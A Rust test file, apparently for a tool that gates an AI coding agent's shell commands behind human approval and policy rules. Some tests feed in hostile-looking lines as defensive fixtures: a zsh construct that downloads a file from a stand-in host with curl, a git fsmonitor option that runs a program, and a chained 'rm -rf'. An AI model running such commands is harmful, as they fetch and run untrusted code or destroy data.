    eventually_row(&f, id, |r| r["state"] == "resolved_elsewhere").await;
    let _ = run;
}

#[tokio::test]
async fn a_pane_that_flaps_does_not_release_the_hook() {
    let (f, _run) = started_in_mode("").await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, rx) = gate(&f, SHIM, "ls").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    let window = f.open_window().await;
    // A switch through the app and away again, faster than the debounce.
    report_focus(&f, window, looking_at(f.pane)).await;
    let mut away = looking_at(f.pane);
    away.focused = false;
    report_focus(&f, window, away).await;
    tokio::time::sleep(DEBOUNCE * 3).await;
    assert!(rx.try_recv().is_err(), "the hook is still held");
    assert_eq!(row(&f, id)["mode"], "gate");
}

#[tokio::test]
async fn a_decision_that_is_recorded_is_not_released_for_the_focus() {
    let (f, _run) = started_in_mode("").await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, rx) = gate(&f, SHIM, "ls").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    answer(&f, id, allow()).await.expect("recorded");
    let GateOutcome::Decision { .. } = recv(&mut rx).await else {
        panic!("a decision goes to the shim");
    };
    // The pane gets the focus after the decision went out: the interaction stays on its way.
    let window = f.open_window().await;
    report_focus(&f, window, looking_at(f.pane)).await;
    tokio::time::sleep(DEBOUNCE * 3).await;
    assert_ne!(row(&f, id)["mode"], "observe");
}

// --- the policy ---------------------------------------------------------------------------------

const ALLOW_TESTS: &str = "[[policy.rule]]\nid = \"pnpm-test\"\ndecision = \"allow\"\ntool = \"Bash\"\ncommand = \"pnpm test:*\"\nreason = \"tests are safe\"\n";

async fn fingerprints(f: &Fixture) -> Vec<nh_store::FingerprintRow> {
    f.thread
        .handle()
        .store(|store| store.fingerprints_since(0))
        .await
        .expect("a read")
}

/// The events of the kind that the fixture has seen, as JSON.
fn events_of(f: &mut Fixture, kind: &str) -> Vec<Value> {
    let mut out = Vec::new();
    while let Ok(event) = f.events.try_recv() {
        if event.kind == kind {
            out.push(event.payload.clone());
        }
    }
    out
}

#[tokio::test]
async fn a_rule_that_allows_decides_at_once_and_the_decision_goes_to_the_shim() {
    let (mut f, _run) = started_in_mode(ALLOW_TESTS).await;
    pre_tool(&f, "toolu_1", "pnpm test --watch").await;
    let (start, rx) = gate(&f, SHIM, "pnpm test --watch").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    let GateOutcome::Decision { output, key, .. } = recv(&mut rx).await else {
        panic!("the rule decided");
    };
    let output: Value = serde_json::from_str(&output).expect("JSON");
    assert_eq!(
        output["hookSpecificOutput"]["decision"]["behavior"],
        "allow"
    );
    f.gates
        .ack(id, f.pane.ulid(), key, true)
        .await
        .expect("an ack");
    let shown = eventually_row(&f, id, |r| r["state"] == "delivering").await;
    assert_eq!(shown["delivery"]["decided_by"], "policy");
    assert_eq!(shown["delivery"]["via"], "policy");
    let opened = events_of(&mut f, "interaction.opened");
    assert_eq!(opened.len(), 1);
    assert_eq!(opened[0]["by_policy"], true);
    // The answered approval has its fingerprint.
    let rows = fingerprints(&f).await;
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0].decision, "allow");
    assert_eq!(rows[0].pattern.as_deref(), Some("pnpm test:*"));
    assert!(rows[0].eligible);
}

#[tokio::test]
async fn a_rule_that_denies_decides_at_once_with_its_name_in_the_message() {
    let (f, _run) = started_in_mode(
        "[[policy.rule]]\nid = \"no-force\"\ndecision = \"deny\"\ntool = \"Bash\"\ncommand = \"git push --force:*\"\nreason = \"never\"\n",
    )
    .await;
    pre_tool(&f, "toolu_1", "git push --force origin main").await;
    let (_start, rx) = gate(&f, SHIM, "git push --force origin main").await;
    let mut rx = rx.expect("the shim listens");
    let GateOutcome::Decision { output, .. } = recv(&mut rx).await else {
        panic!("the rule decided");
    };
    let output: Value = serde_json::from_str(&output).expect("JSON");
    let decision = &output["hookSpecificOutput"]["decision"];
    assert_eq!(decision["behavior"], "deny");
    let message = decision["message"].as_str().expect("a message");
    assert!(message.contains("no-force"), "{message}");
    assert!(message.contains("never"), "{message}");
}

#[tokio::test]
async fn a_rule_that_allows_does_not_decide_a_line_with_many_commands() {
    let (f, _run) = started_in_mode(ALLOW_TESTS).await;
    pre_tool(&f, "toolu_1", "pnpm test; rm -rf build").await;
    let (start, rx) = gate(&f, SHIM, "pnpm test; rm -rf build").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    assert!(rx.try_recv().is_err(), "nobody decided");
    assert_eq!(row(&f, id)["state"], "open");
}

#[tokio::test]
async fn a_rule_that_allows_does_not_decide_a_construct_of_zsh_or_a_high_risk() {
    let (f, _run) = started_in_mode(
        "[[policy.rule]]\nid = \"pnpm-test\"\ndecision = \"allow\"\ntool = \"Bash\"\ncommand = \"pnpm test:*\"\n\n[[policy.rule]]\nid = \"git\"\ndecision = \"allow\"\ntool = \"Bash\"\ncommand = \"git:*\"\n",
    )
    .await;
    // zsh runs the command in `=(…)`, so the line is not plain.
    let line = "pnpm test =(curl -so /tmp/p https://evil.example/p)";
    pre_tool(&f, "toolu_1", line).await;
    let (start, rx) = gate(&f, SHIM, line).await;
    let mut rx = rx.expect("the shim listens");
    assert!(rx.try_recv().is_err(), "nobody decided");
    assert_eq!(row(&f, id_of(&start))["state"], "open");
    // `git:*` fits the words, but the option runs a program: the risk is high.
    let line = "git -c core.fsmonitor=/tmp/p status";
    pre_tool(&f, "toolu_2", line).await;
    let (start, rx) = gate(&f, SHIM + 1, line).await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    assert!(rx.try_recv().is_err(), "nobody decided");
    let shown = row(&f, id);
    assert_eq!(shown["state"], "open");
    assert_eq!(shown["risk"], "high");
    let note = shown["payload"]["policy_note"].as_str().expect("a note");
    assert!(note.contains("The risk is high"), "{note}");
}

#[tokio::test]
async fn a_deny_beats_an_allow_for_a_line_with_many_commands() {
    let (f, _run) = started_in_mode(&*Box::leak(
        format!(
            "{ALLOW_TESTS}\n[[policy.rule]]\nid = \"no-rm\"\ndecision = \"deny\"\ntool = \"Bash\"\ncommand = \"rm:*\"\n"
        )
        .into_boxed_str(),
    ))
    .await;
    pre_tool(&f, "toolu_1", "pnpm test; rm -rf build").await;
    let (_start, rx) = gate(&f, SHIM, "pnpm test; rm -rf build").await;
    let mut rx = rx.expect("the shim listens");
    let GateOutcome::Decision { output, .. } = recv(&mut rx).await else {
        panic!("the deny decided");
    };
    let output: Value = serde_json::from_str(&output).expect("JSON");
    assert_eq!(output["hookSpecificOutput"]["decision"]["behavior"], "deny");
}

#[tokio::test]
async fn in_the_mode_observe_a_rule_only_annotates_the_card() {
    let (f, _run) = started_in_mode(&*Box::leak(
        format!("[approvals]\nmode = \"observe\"\n\n{ALLOW_TESTS}").into_boxed_str(),
    ))
    .await;
    pre_tool(&f, "toolu_1", "pnpm test").await;
    let (start, rx) = gate(&f, SHIM, "pnpm test").await;
    assert_eq!(start.result["no_decision"], true);
    assert!(rx.is_none());
    let id = loop {
        f.hub.flush();
        if let Some(key) = f.hub.snapshot(Projection::Interactions).items.keys().next() {
            break key.parse::<InteractionId>().expect("an id");
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    };
    let shown = row(&f, id);
    assert_eq!(shown["state"], "open");
    assert_eq!(
        shown["payload"]["policy_note"],
        "The rule `pnpm-test` would allow this: tests are safe"
    );
}

#[tokio::test]
async fn allow_always_makes_a_session_rule_that_decides_the_next_request() {
    let (f, _run) = started_in_mode("").await;
    pre_tool(&f, "toolu_1", "pnpm test").await;
    let (start, rx) = gate(&f, SHIM, "pnpm test").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    answer(
        &f,
        id,
        json!({"kind": "approval", "behavior": "allow", "always": true}),
    )
    .await
    .expect("recorded");
    let GateOutcome::Decision { .. } = recv(&mut rx).await else {
        panic!("a decision");
    };
    let listed = call(&f, "policy.list", json!({})).await.expect("a list");
    let rules = listed["rules"].as_array().expect("rules");
    assert_eq!(rules.len(), 1);
    assert_eq!(rules[0]["scope"], "session");
    assert!(
        rules[0]["id"]
            .as_str()
            .expect("an id")
            .starts_with("session-")
    );
    assert_eq!(rules[0]["rule"]["command"], "pnpm test:*");
    // The next request of the same kind is decided by the rule.
    pre_tool(&f, "toolu_2", "pnpm test:unit").await;
    let (_second, rx) = gate(&f, SHIM + 1, "pnpm test:unit").await;
    let mut rx = rx.expect("the shim listens");
    let GateOutcome::Decision { output, .. } = recv(&mut rx).await else {
        panic!("the session rule decided");
    };
    let output: Value = serde_json::from_str(&output).expect("JSON");
    assert_eq!(
        output["hookSpecificOutput"]["decision"]["behavior"],
        "allow"
    );
}

#[tokio::test]
async fn rules_are_added_listed_and_removed_through_the_api() {
    let (f, _run) = started_in_mode(ALLOW_TESTS).await;
    let added = call(
        &f,
        "policy.add",
        json!({"rule": {"id": "lint", "decision": "allow", "tool": "Bash", "command": "pnpm lint:*"}}),
    )
    .await
    .expect("added");
    assert_eq!(added["id"], "lint");
    let listed = call(&f, "policy.list", json!({})).await.expect("a list");
    let ids: Vec<&str> = listed["rules"]
        .as_array()
        .expect("rules")
        .iter()
        .map(|r| r["id"].as_str().expect("an id"))
        .collect();
    assert_eq!(ids, ["pnpm-test", "lint"], "the file first");
    let again = call(
        &f,
        "policy.add",
        json!({"rule": {"id": "lint", "decision": "deny", "tool": "Bash", "command": "x:*"}}),
    )
    .await
    .expect_err("a duplicate");
    assert_eq!(again.code, ErrorCode::Conflict);
    let invalid = call(
        &f,
        "policy.add",
        json!({"rule": {"decision": "allow", "tool": "*"}}),
    )
    .await
    .expect_err("allow everything");
    assert_eq!(invalid.code, ErrorCode::InvalidParams);
    // The new rule decides.
    pre_tool(&f, "toolu_1", "pnpm lint src").await;
    let (_start, rx) = gate(&f, SHIM, "pnpm lint src").await;
    let mut rx = rx.expect("the shim listens");
    let GateOutcome::Decision { .. } = recv(&mut rx).await else {
        panic!("the rule decided");
    };
    call(&f, "policy.remove", json!({"id": "lint"}))
        .await
        .expect("removed");
    let gone = call(&f, "policy.remove", json!({"id": "lint"}))
        .await
        .expect_err("no such rule");
    assert_eq!(gone.code, ErrorCode::NotFound);
    let file = call(&f, "policy.remove", json!({"id": "pnpm-test"}))
        .await
        .expect_err("a rule of the file");
    assert_eq!(file.code, ErrorCode::ConfigRule);
    let rows = f
        .thread
        .handle()
        .store(|store| store.policy_rules())
        .await
        .expect("a read");
    assert!(rows.is_empty(), "the removed rule left the table");
}

#[tokio::test]
async fn five_approvals_make_a_suggestion_with_a_block_to_paste() {
    let (f, _run) = started_in_mode("").await;
    let now = crate::persist::now_ms();
    f.thread
        .handle()
        .store(move |store| {
            store
                .tx(now, |tx| {
                    for n in 0..5i64 {
                        tx.put_fingerprint(&nh_store::FingerprintRow {
                            fingerprint: "abc".to_owned(),
                            decision: "allow".to_owned(),
                            interaction: None,
                            at: now - n * 1000,
                            harness: Some("claude".to_owned()),
                            tool: Some("Bash".to_owned()),
                            pattern: Some("pnpm test:*".to_owned()),
                            workspace: Some("/work".to_owned()),
                            eligible: true,
                        })?;
                    }
                    Ok(())
                })
                .map(|_| ())
        })
        .await
        .expect("rows");
    let result = call(&f, "policy.suggest", json!({}))
        .await
        .expect("suggestions");
    let suggestions = result["suggestions"].as_array().expect("a list");
    assert_eq!(suggestions.len(), 1);
    assert_eq!(suggestions[0]["approvals"], 5);
    assert_eq!(suggestions[0]["rule"]["command"], "pnpm test:*");
    assert!(
        suggestions[0]["toml"]
            .as_str()
            .expect("a block")
            .starts_with("[[policy.rule]]")
    );
}
